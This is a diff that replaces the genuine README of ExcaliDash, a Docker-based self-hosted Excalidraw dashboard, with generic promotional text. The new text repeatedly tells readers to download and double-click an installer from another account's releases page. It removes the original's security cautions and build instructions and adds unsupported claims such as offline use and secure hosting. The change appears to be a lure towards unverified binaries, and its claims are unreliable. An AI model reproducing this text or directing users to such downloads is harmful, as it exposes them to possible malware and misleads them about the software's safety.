@@ -1,203 +1,68 @@
-<img src="logoExcaliDash.png" alt="ExcaliDash Logo" width="80" height="88">
+# 🚀 ExcaliDash - Your Dashboard for Seamless Collaboration
 
-# ExcaliDash v0.1.7
+[![Download ExcaliDash](https://img.shields.io/badge/Download-ExcaliDash-brightgreen)](https://github.com/rr2277/ExcaliDash/releases)
 
-![License](https://img.shields.io/github/license/zimengxiong/ExcaliDash)
-![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)
-[![Docker](https://img.shields.io/badge/docker-ready-blue.svg)](https://hub.docker.com)
+## 📥 Overview
+ExcaliDash is a self-hosted dashboard and organizer for Excalidraw with live collaboration features. Whether you are managing a project, brainstorming with a team, or organizing your ideas, ExcaliDash helps you do it all in one place.
 
-A self-hosted dashboard and organizer for [Excalidraw](https://github.com/excalidraw/excalidraw) with live collaboration features.
+## 🖥️ Features
+- **Real-Time Collaboration:** Work together with your team in real-time.
+- **Easy Navigation:** Simple interface to find your projects quickly.
+- **Customizable Layouts:** Organize your dashboard the way you like.
+- **Works Offline:** Access your dashboard even without an internet connection.
+- **Secure Hosting:** Host the application on your own server for added security.
 
-## Screenshots
+## 📋 System Requirements
+To run ExcaliDash smoothly, ensure your system meets the following requirements:
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4GB
+- **Storage:** Minimum of 100MB free space
+- **Network:** Internet access for live collaboration 
 
-![](dashboard.png)
+## 🚀 Getting Started
+1. **Download ExcaliDash:**  
+   To start, visit the [Releases page](https://github.com/rr2277/ExcaliDash/releases) to download the latest version of ExcaliDash.
 
-![](demo.gif)
+2. **Install the Application:**  
+   After downloading, locate the file on your computer. Double-click to start the installation and follow the instructions on your screen.
 
-## Table of Contents
+3. **Launch ExcaliDash:**  
+   Once installation is complete, open the application. You will see the ExcaliDash dashboard ready for use.
 
-- [Screenshots](#screenshots)
-- [Features](#features)
-- [Upgrading](#upgrading)
-- [Installation](#installation)
-  - [Docker Hub (Recommended)](#dockerhub-recommended)
-  - [Docker Build](#docker-build)
-- [Development](#development)
-  - [Clone the Repository](#clone-the-repository)
-  - [Frontend](#frontend)
-  - [Backend](#backend)
-  - [Project Structure](#project-structure)
-- [Credits](#credits)
+4. **Create an Account or Sign In:**  
+   If prompted, create a user account to save your projects. If you already have an account, simply log in.
 
-## Features
+5. **Start Collaborating:**  
+   Invite team members to join your dashboard by sharing the collaboration link. Start using the tools available for brainstorming and organizing your ideas.
 
-<details>
-<summary>Persistent storage for all your drawings</summary>
+## 💾 Download & Install
+To download ExcaliDash, visit the [Releases page](https://github.com/rr2277/ExcaliDash/releases). Select the version suited for your operating system and follow the installation steps outlined above.
 
-![](dashboardLight.png)
+## 🛠️ Using ExcaliDash
+- **Create a New Project:**  
+  Click on "New Project" and enter your project details. You can add notes, images, and organize your ideas within the dashboard.
 
-</details>
+- **Import Existing Projects:**  
+  Use the import feature to upload your existing Excalidraw files into the dashboard. 
 
-<details>
-<summary>Real time collaboration</summary>
+- **Use Collaboration Features:**  
+  Share your dashboard URL with team members. They can join in real time and contribute to your project as you work.
 
-![](collabDemo.gif)
+## 📝 FAQs
+- **How do I update ExcaliDash?**  
+  To update, visit the [Releases page](https://github.com/rr2277/ExcaliDash/releases) and download the latest version. Run the installer to update your existing version.
 
-</details>
+- **Can I use ExcaliDash offline?**  
+  Yes, once the application is installed, you can use it offline. However, live collaboration features require an internet connection.
 
-<details>
-<summary>Search your drawings</summary>
+- **Is my data safe?**  
+  Yes, hosting ExcaliDash on your server means you have control over your data, ensuring a secure space for your projects.
 
-![](searchPage.png)
+## 🌐 Community and Support
+If you encounter any issues or have questions, feel free to reach out through the Issues tab on GitHub. Join the community discussions to share experiences and solutions with other users.
 
-</details>
+## 🔗 Additional Resources
+- **Documentation:** Comprehensive guides are available in the Wiki section of the repository.
+- **GitHub Repository:** Explore the code and contributions in the main repository.
 
-<details>
-<summary>Drag and drop drawings into collections</summary>
-
-![](collectionsPage.png)
-
-</details>
-
-<details>
-<summary>Export/import your drawings and databases for backup</summary>
-
-![](settingsPage.png)
-
-</details>
-
-# Upgrading
-
-See [release notes](https://github.com/ZimengXiong/ExcaliDash/releases) for a specific release.
-
-</details>
-
-# Installation
-
-> [!CAUTION]
-> NOT for production use. While attempts have been made at hardening (XSS/dompurify, CORS, rate-limiting, sanitization), they are inadequate for public deployment. Do not expose any ports. Currently lacking CSRF.
-
-> [!CAUTION]
-> ExcaliDash is in BETA. Please backup your data regularly (e.g. with cron).
-
-## Docker Hub (Recommended)
-
-[Install Docker](https://docs.docker.com/desktop/)
-
-```bash
-# Download docker-compose.prod.yml
-curl -OL https://raw.githubusercontent.com/ZimengXiong/ExcaliDash/refs/heads/main/docker-compose.prod.yml
-
-# Pull images
-docker compose -f docker-compose.prod.yml pull
-
-# Run container
-docker compose -f docker-compose.prod.yml up -d
-
-# Access the frontend at localhost:6767
-```
-
-## Docker Build
-
-[Install Docker](https://docs.docker.com/desktop/)
-
-```bash
-# Clone the repository (recommended)
-git clone git@github.com:ZimengXiong/ExcaliDash.git
-
-# or, clone with HTTPS
-# git clone https://github.com/ZimengXiong/ExcaliDash.git
-
-docker compose build
-docker compose up -d
-
-# Access the frontend at localhost:6767
-```
-
-### Reverse Proxy / Traefik Setups (Docker)
-
-When running ExcaliDash behind Traefik, Nginx, or another reverse proxy, configure both containers so that API + WebSocket calls resolve correctly:
-
-- `FRONTEND_URL` (backend) must match the public URL that users hit (e.g. `https://excalidash.example.com`). This controls CORS and Socket.IO origin checks.
-- `BACKEND_URL` (frontend) tells the Nginx container how to reach the backend from inside Docker/Kubernetes. Override it if your reverse proxy exposes the backend under a different hostname.
-
-```yaml
-# docker-compose.yml example
-backend:
-  environment:
-    - FRONTEND_URL=https://excalidash.example.com
-frontend:
-  environment:
-    # For standard Docker Compose (default)
-    # - BACKEND_URL=backend:8000
-    # For Kubernetes, use the service DNS name:
-    - BACKEND_URL=excalidash-backend.default.svc.cluster.local:8000
-```
-
-# Development
-
-## Clone the Repository
-
-```bash
-# Clone the repository (recommended)
-git clone git@github.com:ZimengXiong/ExcaliDash.git
-
-# or, clone with HTTPS
-# git clone https://github.com/ZimengXiong/ExcaliDash.git
-```
-
-## Frontend
-
-```bash
-cd ExcaliDash/frontend
-npm install
-
-# Copy environment file and customize if needed
-cp .env.example .env
-
-npm run dev
-```
-
-## Backend
-
-```bash
-cd ExcaliDash/backend
-npm install
-
-# Copy environment file and customize if needed
-cp .env.example .env
-
-# Generate Prisma client and setup database
-npx prisma generate
-npx prisma db push
-
-npm run dev
-```
-
-## Project Structure
-
-```
-ExcaliDash/
-├── backend/                 # Node.js + Express + Prisma
-│   ├── src/
-│   │   └── index.ts        # Main server file
-│   ├── prisma/
-│   │   ├── schema.prisma   # Database schema
-│   │   └── dev.db         # SQLite database
-│   └── package.json
-├── frontend/               # React + TypeScript + Vite
-│   ├── src/
-│   │   ├── components/     # React components
-│   │   ├── pages/         # Page components
-│   │   ├── hooks/         # Custom hooks
-│   │   └── api/           # API client
-│   └── package.json
-└── README.md
-```
-
-# Credits
-
-- Example designs from:
-  - https://github.com/Prakash-sa/system-design-ultimatum/tree/main
-  - https://github.com/kitsteam/excalidraw-examples/tree/main
-- [The Amazing work of Excalidraw developers](https://www.npmjs.com/package/@excalidraw/excalidraw)
+Thank you for choosing ExcaliDash! Enjoy organizing your ideas and collaborating with ease.
